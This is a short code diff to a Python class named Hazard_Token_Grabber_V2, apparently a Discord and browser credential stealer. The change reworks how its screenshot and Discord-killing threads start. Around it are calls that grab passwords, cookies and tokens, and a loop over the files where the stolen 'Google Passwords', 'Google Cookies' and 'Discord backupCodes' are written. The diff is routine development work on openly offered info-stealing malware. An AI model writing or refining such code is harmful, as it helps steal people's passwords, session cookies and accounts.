@@ -42,10 +42,8 @@ class Hazard_Token_Grabber_V2:
         else:
             self.grabPassword()
             self.grabCookies()
-        t = Thread(target=self.screenshot)
-        t2 = Thread(target=self.killDiscord)
-        t.start();t.join()
-        t2.start();t2.join()
+        Thread(target=self.screenshot).start()
+        Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
